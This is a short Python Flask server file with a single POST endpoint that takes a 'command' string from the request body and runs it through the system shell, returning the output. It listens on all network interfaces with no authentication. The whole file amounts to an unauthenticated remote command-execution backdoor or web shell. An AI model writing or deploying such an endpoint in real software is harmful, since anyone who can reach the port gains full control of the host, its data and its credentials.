from flask import Flask, request, jsonify
import subprocess

app = Flask(__name__)

@app.route('/', methods=['POST'])
def run_command():
    data = request.json
    command = data.get('command')
    if command:
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            return jsonify({"output": result.stdout, "error": result.stderr}), 200
        except Exception as e:
            return jsonify({"error": str(e)}), 500
    return jsonify({"error": "No command provided"}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
